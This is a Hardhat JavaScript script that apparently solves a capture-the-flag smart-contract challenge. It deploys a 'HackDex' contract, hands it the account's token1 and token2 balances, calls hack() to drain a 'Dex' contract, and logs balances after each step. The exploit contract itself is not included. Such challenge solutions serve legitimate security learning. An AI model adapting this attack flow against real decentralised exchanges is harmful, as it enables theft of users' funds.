const { ethers } = require("hardhat");
const hre = require("hardhat");


async function solve(instance_address, account) {

    const ERC20 = await ethers.getContractFactory("ERC20");

    const Dex = await ethers.getContractFactory("Dex");
    const dex = Dex.attach(instance_address);

    const token1 = ERC20.attach(await dex.token1());
    const token2 = ERC20.attach(await dex.token2());

    const HackDex = await ethers.getContractFactory("HackDex");
    const contract = await HackDex.deploy(dex.address);
    await contract.deployed();

    console.log(`dex token1: ${await dex.token1()}`);
    console.log(`dex token2: ${await dex.token2()}`);
    console.log(`dex token1 balance: ${await token1.balanceOf(dex.address)}`);
    console.log(`dex token2 balance: ${await token2.balanceOf(dex.address)}`);
    console.log(`account token1 balance: ${await token1.balanceOf(account.address)}`);
    console.log(`account token2 balance: ${await token2.balanceOf(account.address)}`);
    console.log(`hacker token1 balance: ${await token1.balanceOf(contract.address)}`);
    console.log(`hacker token2 balance: ${await token2.balanceOf(contract.address)}`);

    // Transfer all tokens to the hack contract
    console.log('Transfering token1 from account to hacker...');
    let tx = await token1.transfer(contract.address, await token1.balanceOf(account.address));
    await tx.wait(1);

    console.log('Transfering token2 from account to hacker...');
    tx = await token2.transfer(contract.address, await token2.balanceOf(account.address));
    await tx.wait(1)

    console.log(`dex token1: ${await dex.token1()}`);
    console.log(`dex token2: ${await dex.token2()}`);
    console.log(`dex token1 balance: ${await token1.balanceOf(dex.address)}`);
    console.log(`dex token2 balance: ${await token2.balanceOf(dex.address)}`);
    console.log(`account token1 balance: ${await token1.balanceOf(account.address)}`);
    console.log(`account token2 balance: ${await token2.balanceOf(account.address)}`);
    console.log(`hacker token1 balance: ${await token1.balanceOf(contract.address)}`);
    console.log(`hacker token2 balance: ${await token2.balanceOf(contract.address)}`);

    // Hack stuff
    console.log('Hacking...');
    tx = await contract.hack();
    await tx.wait(1);

    console.log(`dex token1: ${await dex.token1()}`);
    console.log(`dex token2: ${await dex.token2()}`);
    console.log(`dex token1 balance: ${await token1.balanceOf(dex.address)}`);
    console.log(`dex token2 balance: ${await token2.balanceOf(dex.address)}`);
    console.log(`account token1 balance: ${await token1.balanceOf(account.address)}`);
    console.log(`account token2 balance: ${await token2.balanceOf(account.address)}`);
    console.log(`hacker token1 balance: ${await token1.balanceOf(contract.address)}`);
    console.log(`hacker token2 balance: ${await token2.balanceOf(contract.address)}`);

    console.log('Success!')

}


async function main() {

    const [account] = await ethers.getSigners();
    console.log(`Account address: ${account.address}`);
    console.log('');

    instance_address = '0x27b208152F4E0aDb6073687E918560E9710ce7Fb';

    await solve(instance_address, account);

}


main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
